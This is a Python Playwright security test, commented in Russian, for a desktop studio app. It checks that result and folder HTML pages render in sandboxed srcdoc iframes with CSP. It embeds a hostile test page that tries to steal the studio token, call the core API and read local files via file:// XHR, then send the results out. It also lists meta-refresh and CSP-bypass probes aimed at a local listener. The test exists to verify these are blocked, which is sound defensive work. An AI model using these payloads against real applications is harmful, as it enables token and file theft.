"""Страница-результат задачи и страница из «Папки» в студии — без прав студии (рецензия выпуска 5, 05.11). Раньше в Linux и
Mac результат показывался с диска (iframe src=file://… с allow-same-origin): у страницы было то же происхождение, что у
студии, — она брала ключ из top.location, звала parent.core.call и читала любой file:// через XHR (WebKitGTK с
ALLOW_FILE_URLS pywebview). Теперь на всех системах — текстом в srcdoc, sandbox="allow-scripts" (без allow-same-origin) и
с CSP: ни родителя, ни файлов, ни сети; предпросмотр сайта — тоже без allow-same-origin; окна pywebview — без XHR к file://
(app.no_file_xhr в harden_webview). Проверяем в Chromium (Playwright): атрибуты фрейма, CSP и что вредная страница ничего не достала."""
import json
import os
import re
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(os.environ.get("DEWIAR_ROOT") or Path(__file__).resolve().parent.parent)
fails = []


def ok(c, m):
    print(("✅ " if c else "❌ ") + m)
    if not c:
        fails.append(m)


got = []


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        got.append(self.path)
        self.send_response(204)
        self.end_headers()


srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
PORT = srv.server_address[1]
KEY = ROOT / "tests" / "result_frame_test.py"             # «чужой файл» компьютера — сама эта проверка
EVIL = f"""<html><head><title>Отчёт</title></head><body><h1>Отчёт</h1><script>
var r = [];
try {{ r.push('top=' + top.location.search); }} catch (e) {{ r.push('top-blocked'); }}
try {{ r.push('core=' + parent.core.call('set_settings', {{x: 1}})); }} catch (e) {{ r.push('core-blocked'); }}
try {{ var x = new XMLHttpRequest(); x.open('GET', 'file://{KEY.as_posix()}', false); x.send(); r.push('file=' + x.responseText.length); }} catch (e) {{ r.push('file-blocked'); }}
try {{ fetch('http://127.0.0.1:{PORT}/fetch?' + encodeURIComponent(r.join('|'))).catch(function () {{}}); }} catch (e) {{}}
new Image().src = 'http://127.0.0.1:{PORT}/img?' + encodeURIComponent(r.join('|'));
try {{ new WebSocket('ws://127.0.0.1:{PORT}/ws'); }} catch (e) {{}}
document.title = 'RESULT ' + r.join('|');
</script></body></html>"""
TASK = {"id": "t1", "goal": "отчёт", "title": "Отчёт", "status": "done", "status_ru": "готово", "steps": 3, "plan": "",
        "journal": "", "summary": "", "notebook": "", "created": "2026-11-05T10:00:00", "dir": "/tmp/ws/Задачи/t1",
        "outputs": [{"path": "outputs/отчёт.html", "title": "Отчёт"}], "snaps": [], "sandbox": {"mode": "bwrap", "net": False}}
CORE = """(() => { const ready = () => { if (!window.core) return setTimeout(ready, 5);
    core.retry = () => {}; core.connect = () => {}; if (core.ws) { core.ws.onclose = null; core.ws.onerror = null; try { core.ws.close(); } catch (e) {} }
    window.CALLS = []; const TASK = TASK_JSON, EVIL = EVIL_JSON;
    core.call = async (c, a) => { window.CALLS.push([c, a]); if (c === "task_get") return TASK; if (c === "tasks_list") return [TASK];
      if (c === "ws_read") return { text: EVIL, size: EVIL.length, mtime: 1, binary: false };
      if (c === "ws_list") return []; return null; };
    setTimeout(() => core.emit("hello", {}), 200); };
  ready(); })();""".replace("TASK_JSON", json.dumps(TASK, ensure_ascii=False)).replace("EVIL_JSON", json.dumps(EVIL))

from playwright.sync_api import sync_playwright  # noqa: E402
with sync_playwright() as p:
    b = p.chromium.launch()
    errs = []
    pg = b.new_page(viewport={"width": 1300, "height": 900})
    pg.on("pageerror", lambda e: errs.append(str(e)))
    pg.route(re.compile(r"^https?://(?!127\.0\.0\.1)"), lambda r: r.abort())
    pg.add_init_script("window.pywebview = { api: new Proxy({}, { get: () => () => Promise.resolve(true) }) };")
    pg.add_init_script(CORE)
    pg.goto((ROOT / "ui/settings.html").as_uri() + "?token=SECRET-TOKEN&port=1")
    pg.wait_for_timeout(1500)
    pg.evaluate("document.querySelector('nav button[data-p=\"tasks\"]').click()")
    pg.wait_for_timeout(300)
    pg.evaluate("tOpenedFor = ''; tTab = 'results'; openTask('t1')")
    pg.wait_for_timeout(1500)
    fr = pg.locator("#o-view iframe")
    ok(fr.count() == 1 and fr.get_attribute("sandbox") == "allow-scripts" and not fr.get_attribute("src"),
       f"результат задачи — iframe srcdoc, sandbox=\"allow-scripts\" (без allow-same-origin): {fr.get_attribute('sandbox') if fr.count() else '—'}")
    sd = fr.get_attribute("srcdoc") or "" if fr.count() else ""
    ok("Content-Security-Policy" in sd and "default-src 'none'" in sd and sd.index("Content-Security-Policy") < sd.index("<h1>"),
       "в странице — CSP до содержимого (default-src 'none')")
    title = pg.frame_locator("#o-view iframe").locator("title").evaluate("e => e.ownerDocument.title") if fr.count() else ""
    ok("top-blocked" in title and "core-blocked" in title and "file-blocked" in title and "SECRET-TOKEN" not in title,
       f"страница не видит ни адреса студии (ключа), ни core.call, ни файлов компьютера: {title[:120]}")
    calls = pg.evaluate("window.CALLS.filter(c => c[0] === 'set_settings').length")
    pg.wait_for_timeout(800)
    ok(calls == 0 and not got, f"ни одного вызова ядра от страницы, ни одного запроса в сеть ({got[:3]})")
    # «Папка»: страница — тем же способом
    pg.evaluate("document.querySelector('nav button[data-p=\"folder\"]').click()")
    pg.wait_for_timeout(300)
    pg.evaluate("openFile('Задачи/t1/outputs/отчёт.html')")
    pg.wait_for_timeout(1200)
    ff = pg.locator("#f-body iframe")
    ok(ff.count() == 1 and ff.get_attribute("sandbox") == "allow-scripts" and "Content-Security-Policy" in (ff.get_attribute("srcdoc") or ""),
       f"«Папка»: страница — srcdoc, sandbox=\"allow-scripts\", CSP ({ff.get_attribute('sandbox') if ff.count() else '—'})")
    pg.wait_for_timeout(600)
    ok(not got and pg.evaluate("window.CALLS.filter(c => c[0] === 'set_settings').length") == 0, "«Папка»: страница тоже ничего не достала")
    ok(pg.get_attribute("#st-if", "sandbox") == "allow-scripts", "предпросмотр сайта — без allow-same-origin")
    # третья рецензия: CSP — самой первой строкой; обходы «вставки после <head>» и <meta refresh> (p_wk2, p_wk3)
    probe = (f"<script>try{{fetch('http://127.0.0.1:{PORT}/fetch-TAG').catch(function(){{}})}}catch(e){{}};new Image().src='http://127.0.0.1:{PORT}/img-TAG';"
             f"try{{new WebSocket('ws://127.0.0.1:{PORT}/ws-TAG')}}catch(e){{}}</scr" + "ipt>")
    cases = ["<!--<head>--><html><head></head><body>" + probe.replace("TAG", "comment") + "</body></html>",
             probe.replace("TAG", "beforehead") + "<html><head></head><body>x</body></html>",
             "<html><body><header>h</header>" + probe.replace("TAG", "header") + "</body></html>",
             "<html><head><script>var s='<head>';</scr" + "ipt></head><body>" + probe.replace("TAG", "strhead") + "</body></html>",
             "\ufeff<!DOCTYPE html>" + probe.replace("TAG", "bom") + "<html><head></head><body>x</body></html>",
             f"<html><head><meta http-equiv=refresh content='0;url=http://127.0.0.1:{PORT}/nav-refresh'></head><body>x</body></html>",
             f"<html><head><META HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL=http://127.0.0.1:{PORT}/nav-refresh2\"></head><body>x</body></html>",
             # четвёртая рецензия: «>» в кавычках до http-equiv, сущность в значении, кавычка в имени атрибута, «/» вместо пробела
             f'<meta content="0;url=http://127.0.0.1:{PORT}/gt-in-content?x=>" http-equiv="refresh">a',
             f'<meta http-equiv="&#114;efresh" content="0;url=http://127.0.0.1:{PORT}/entity">b',
             f'<meta a"b http-equiv=refresh content=0;url=http://127.0.0.1:{PORT}/quote-in-name>c',
             f'<meta/http-equiv=refresh/content="0;url=http://127.0.0.1:{PORT}/slash">d',
             f'<me<meta http-equiv=x>ta http-equiv=refresh content="0;url=http://127.0.0.1:{PORT}/glue">e']
    firsts = pg.evaluate("""(cases) => cases.map(h => safeDoc(h).slice(0, 60))""", cases)
    ok(all(f.startswith('<!doctype html><meta http-equiv="Content-Security-Policy"') for f in firsts),
       f"safeDoc: CSP — самой первой строкой при любой разметке ({firsts[1]!r})")
    pg.evaluate("""(cases) => cases.forEach(h => { document.body.appendChild(safeFrame(h));
        const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts');
        f.srcdoc = plpSrcdoc(h, { id: 'p', name: 'P' }); document.body.appendChild(f); })""", cases)
    pg.wait_for_timeout(2500)
    ok(not got, f"страница задачи и страница плагина: ни комментарий «<head>», ни скрипт до <head>, ни <meta refresh> не открыли сеть ({got[:4]})")
    ok(pg.evaluate("(h) => plpSrcdoc(h, { id: 'p', name: 'P' }).indexOf('Content-Security-Policy') < plpSrcdoc(h, { id: 'p', name: 'P' }).indexOf('beforehead')", cases[1]),
       "страница плагина: наш CSP — до всего, что есть у страницы")
    # миниатюры и предпросмотр сайтов: без allow-same-origin, без referrer, с CSP (шрифты программы — можно)
    srcs = pg.evaluate("""() => { const h = '<html><head></head><body><img src="http://127.0.0.1:%d/thumb-img"><p>Сайт</p></body></html>';
        const out = {}; out.thumb = safeDoc(h); return out; }""" % PORT)
    ok(srcs["thumb"].startswith('<!doctype html><meta http-equiv="Content-Security-Policy"') and "font-src data:;" in srcs["thumb"],
       "миниатюры и предпросмотр сайтов — через safeDoc: CSP первой строкой, шрифты — только внутри страницы (data:)")
    js_sites = (ROOT / "ui/studio/sites.js").read_text(encoding="utf-8")
    ok('sandbox="allow-same-origin"' not in js_sites and js_sites.count('sandbox="" referrerpolicy="no-referrer"') == 2
       and js_sites.count("safeDoc(") >= 2, "миниатюры сайтов: без allow-same-origin и referrer, страница — через safeDoc")
    ok(pg.get_attribute("#st-if", "referrerpolicy") == "no-referrer", "предпросмотр сайта — без referrer")
    pg.evaluate("""(h) => { const f = document.createElement('iframe'); f.setAttribute('sandbox', ''); f.setAttribute('referrerpolicy', 'no-referrer');
        f.srcdoc = safeDoc(h); document.body.appendChild(f); }""",
                f'<html><head><meta content="0;url=http://127.0.0.1:{PORT}/thumb-refresh?x=>" http-equiv="refresh"></head><body><img src="http://127.0.0.1:{PORT}/thumb-img"></body></html>')
    pg.wait_for_timeout(1500)
    ok(not got, f"миниатюра сайта: ни картинки из сети, ни <meta refresh> ({got[:3]})")
    ok(not errs, f"без ошибок на странице {errs[:2]}")
    b.close()

js = "\n".join((ROOT / "ui/studio" / f).read_text(encoding="utf-8") for f in os.listdir(ROOT / "ui/studio") if f.endswith(".js"))
html = (ROOT / "ui/settings.html").read_text(encoding="utf-8")
both = re.findall(r'sandbox="([^"]*)"', js + html)
ok(not any("allow-scripts" in s_ and "allow-same-origin" in s_ for s_ in both),
   f"нигде в студии нет фрейма со скриптами и allow-same-origin ({sorted(set(both))})")
app = (ROOT / "ui/app.py").read_text(encoding="utf-8")
ok('webview.settings["ALLOW_FILE_URLS"] = False' in app and app.count('harden_webview("') >= 2 and "    no_file_xhr()" in app
   and 'A.harden_webview("cocoa")' in (ROOT / "ui/macui.py").read_text(encoding="utf-8"),
   "окна pywebview (Linux, Windows, Mac) — без XHR к file:// (ALLOW_FILE_URLS=False)")
srv.shutdown()
print("ИТОГ:", "всё прошло" if not fails else f"провалов {len(fails)}")
sys.exit(1 if fails else 0)
